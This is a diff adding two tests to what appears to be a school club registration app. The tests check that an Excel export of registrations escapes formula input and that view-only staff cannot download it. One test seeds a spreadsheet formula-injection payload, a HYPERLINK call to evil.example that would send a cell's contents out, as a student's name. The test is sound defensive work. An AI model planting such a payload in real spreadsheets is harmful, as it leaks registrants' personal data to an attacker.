@@ -256,3 +256,29 @@ async def test_registrations_xlsx(client, db, make_user):
     assert len(robot) == 2 and robot[1][8] == "Төлсөн" and robot[1][0] == 9
     assert list(wb["Дуу"].iter_rows(values_only=True)) == [header]               # бүртгэлгүй дугуйлан: зөвхөн толгой
     assert (await client.get(f"{A}/rounds/999999/registrations.xlsx", headers=h)).status_code == 404
+
+
+async def test_registrations_xlsx_never_writes_public_input_as_formula(client, db, make_user):
+    import zipfile
+
+    from openpyxl import load_workbook
+    s = await seed_clubs(db)
+    h = await manager_headers(client, make_user)
+    evil = '=HYPERLINK("http://evil.example/?x="&G2,"Дэлгэрэнгүй")'
+    await add_reg(db, s, s.chess_id, "a@shineue.edu.mn", 5, student_first_name=evil, guardian_last_name="@SUM(A1)", phone="+976 99001122")
+    r = await client.get(f"{A}/rounds/{s.round_id}/registrations.xlsx", headers=h)
+    z = zipfile.ZipFile(io.BytesIO(r.content))
+    assert not any(b"<f>" in z.read(n) for n in z.namelist() if n.startswith("xl/worksheets/"))
+    ws = load_workbook(io.BytesIO(r.content))["Шатар"]
+    col = {c.value: i for i, c in enumerate(ws[1])}
+    name = ws[2][col["Сурагчийн нэр"]]
+    assert name.value == evil and name.data_type == "s" and name.quotePrefix
+    assert ws[2][col["Утас"]].quotePrefix and not ws[2][col["Сурагчийн овог"]].quotePrefix
+
+
+async def test_registrations_xlsx_requires_edit_permission(client, db, make_user):
+    s = await seed_clubs(db)
+    v = await staff_headers(client, make_user, "clubviewer", roles=("clubs.view",))
+    assert (await client.get(f"{A}/clubs/{s.chess_id}/registrations/", headers=v)).status_code == 200
+    r = await client.get(f"{A}/rounds/{s.round_id}/registrations.xlsx", headers=v)
+    assert r.status_code == 403 and r.json() == {"detail": "Танд энэ хэсгийг зөвхөн харах эрх байна."}
